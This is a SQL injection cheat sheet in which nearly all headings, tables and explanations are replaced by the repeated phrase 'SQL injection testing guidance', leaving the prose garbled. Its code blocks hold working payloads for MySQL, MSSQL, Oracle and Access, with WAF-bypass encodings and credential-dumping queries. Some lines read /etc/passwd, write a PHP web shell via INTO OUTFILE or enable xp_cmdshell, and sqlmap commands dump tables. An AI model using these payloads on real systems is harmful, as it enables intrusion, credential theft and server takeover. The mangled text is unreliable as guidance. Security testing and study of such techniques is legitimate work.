# Web SQL injection testing guidance - SQL SQL injection testing guidance

> SQL injection testing guidance: WooYun SQL injection testing guidance（27,732 SQL SQL injection testing guidance）| SQL injection testing guidance web-injection.md

## SQL injection testing guidance、SQLSQL injection testing guidance

### 1.1 SQL injection testing guidance

```
SQL injection testing guidance → SQL injection testing guidanceSQLSQL injection testing guidance → SQL injection testing guidance → SQL injection testing guidance
```

**SQL injection testing guidance**：SQLSQL injection testing guidance = SQL injection testing guidance + SQL injection testing guidanceSQLSQL injection testing guidance

### 1.2 SQL injection testing guidance

#### SQL injection testing guidance

| SQL injection testing guidance | SQL injection testing guidance | SQL injection testing guidance |
|---------|------|---------|
| SQL injection testing guidance | 66% | SQL injection testing guidance/SQL injection testing guidance |
| SQL injection testing guidance | 64% | LIKESQL injection testing guidance |
| POSTSQL injection testing guidance | 60% | SQL injection testing guidance |
| HTTPSQL injection testing guidance | 26% | UA/Referer/XFF |
| GETSQL injection testing guidance | 24% | URLSQL injection testing guidance |
| Cookie | 12% | SQL injection testing guidance |

**SQL injection testing guidance**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NETSQL injection testing guidance：`__viewstate`, `__eventvalidation`

#### SQL injection testing guidance

```
1. SQL injection testing guidance/SQL injection testing guidance → SQL injection testing guidance
2. SQL injection testing guidance: id=2-1 / id=1*1 → SQL injection testing guidance
3. SQL injection testing guidance: and 1=1 / and 1=2 → SQL injection testing guidance
4. SQL injection testing guidance: and sleep(5) → SQL injection testing guidance
5. SQL injection testing guidance: order by N → SQL injection testing guidance
```

#### SQL injection testing guidance

| SQL injection testing guidance | SQL injection testing guidance | SQL injection testing guidance | SQL injection testing guidance |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | SQL injection testing guidance | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 SQL injection testing guidancePayload

#### SQL injection testing guidance

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### SQL injection testing guidance

```sql
-- MySQL（SQL injection testing guidance）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### SQL injection testing guidance

```sql
id=1 ORDER BY N--              -- SQL injection testing guidance
id=-1 UNION SELECT 1,2,3,4,5--  -- SQL injection testing guidance
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### SQL injection testing guidance

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHARSQL injection testing guidance
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/SQL injection testing guidance

#### SQL injection testing guidance（SQL injection testing guidance）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMSSQL injection testing guidance
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### SQL injection testing guidance

```sql
-- SQL injection testing guidance: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URLSQL injection testing guidance: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### SQL injection testing guidance + SQL injection testing guidance

```sql
UnIoN SeLeCt                    -- SQL injection testing guidance
UNION/**/SELECT/**/1,2,3        -- SQL injection testing guidance
UNION%09SELECT                  -- TabSQL injection testing guidance
UNION%0ASELECT                  -- SQL injection testing guidance
```

#### SQL injection testing guidance

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> SQL injection testing guidanceA
```

#### SQL injection testing guidance

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- SQL injection testing guidance
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### SQL injection testing guidance（GBKSQL injection testing guidance）

```
%bf%27 SQL injection testing guidance addslashes()   -- GBKSQL injection testing guidance
```

#### HTTPSQL injection testing guidance

```
SQL injection testing guidance: id=1&id=2             -- SQL injection testing guidance
SQL injection testing guidance: Transfer-Encoding: chunked
X-Forwarded-ForSQL injection testing guidance / CookieSQL injection testing guidance  -- SQL injection testing guidance
```

### 1.5 SQL injection testing guidance

#### MySQLSQL injection testing guidance

```sql
-- 1.SQL injection testing guidance -> 2.SQL injection testing guidance -> 3.SQL injection testing guidance -> 4.SQL injection testing guidance -> 5.SQL injection testing guidance -> 6.SQL injection testing guidance -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'< php @system($_POST[cmd]); >',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQLSQL injection testing guidance

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- SQL injection testing guidance（SQL injection testing guidancesaSQL injection testing guidance）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### OracleSQL injection testing guidance

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### AccessSQL injection testing guidance

```sql
-- SQL injection testing guidanceinformation_schema，SQL injection testing guidance
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- SQL injection testing guidanceNOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 SQL injection testing guidance

```python
# SQL injection testing guidance（SQL injection testing guidance）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id =  ");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id =  "); // Java
```

- SQL injection testing guidance/SQL injection testing guidance（SQL injection testing guidance）、SQL injection testing guidance（SQL injection testing guidance）
- SQL injection testing guidance + SQL injection testing guidance
- SQL injection testing guidance + SQL injection testing guidance + WAFSQL injection testing guidance

---


---

## SQL injection testing guidance：SQLMapSQL injection testing guidance

```bash
# SQL injection testing guidance
sqlmap -u "http://t/p.php id=1" --batch
# POSTSQL injection testing guidance
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Cookie/HTTPSQL injection testing guidance
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# SQL injection testing guidanceWAF
sqlmap -u "http://t/p.php id=1" --tamper=space2comment,between --batch
# SQL injection testing guidance
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
